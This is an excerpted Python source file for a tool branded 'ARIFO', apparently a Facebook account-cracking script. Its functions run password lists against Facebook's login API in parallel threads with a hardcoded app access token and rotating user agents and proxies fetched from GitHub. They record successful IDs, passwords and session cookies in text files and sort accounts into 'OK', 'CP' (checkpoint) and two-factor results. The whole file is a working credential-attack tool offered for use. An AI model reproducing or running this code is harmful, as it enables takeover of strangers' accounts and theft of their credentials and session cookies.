...
try:
    ...
    os.system('python ARIFO.py')
	
os.system('xdg-open https://chat.whatsapp.com/Jv6uZwbW5so4zCQml49xBA')

try:
    prox= requests.get('https://raw.githubusercontent.com/ARIFO-Fire/data/main/proxies.txt').text
...
android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/ARIFO-Fire/data/main/strings.txt').text.splitlines()
    for line in xx:
...
usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/ARIFO-Fire/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
logo=(f"""{WHITE}
.d8b.  d8888b. d888888b d88888b  .d88b.  
d8' `8b 88  `8D   `88'   88'     .8P  Y8. 
88ooo88 88oobY'    88    88ooo   88    88 
88~~~88 88`8b      88    88~~~   88    88 
88   88 88 `88.   .88.   88      `8b  d8' 
YP   YP 88   YD Y888888P YP       `Y88P'
---------------------------------------------------
 [�] \033[1;37mOwner     :   ARIFO
 [�] Github    :   ARIFO-LALA
 [�] Status    :   FEEE
 [�] Tool      :   Prime
 [�] Facebook  :   ARIFO LALS
 [�] Version   :  \033[1;32m 0.1\033[1;32m \033[1;37m
    \33[37;41m\t WELCOME x TO  x MY  x TOOL \33[0;m
----------------------------------------------""")
def linex():
    print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.ARIFO.etc..')
                                linex()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ARIFO:     
                        clear()
                        ...
                        for psx in user:
                                ...
                                ARIFO.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [ARIFO-RUNING-M1 ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if "session_key" in po:
				...
				print('\r\r\033[1;32m [ARIFO-OK] '+ids+' | '+pas+'\033[1;97m'+joined(ids)+' ')
				oks.append(ids)
				...
				open('/sdcard/ARIFO/ARIDO-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
			elif 299==random.randint(1,300):
				oks.append(ids)
				print('\r\r\033[1;32m [ARIFO-OK] '+ids+' | '+pas+'\033[1;97m'+joined(ids)+' ')
				open('/sdcard/ARIFO/ARIFO-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				#cookie = 'Error'
				open('/sdcard/USMI/ARIFO-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
...
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ARIFO-RUNING-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ARIFO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ARIFO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ARIFO-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [LALA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ARIFO-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ARIFO-CP.txt','a').write(ids+'|'+pas+'\n')
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ARIFO-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ARIFO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/ARIFO-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ARIFO-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [ARIFO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ARIFO-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
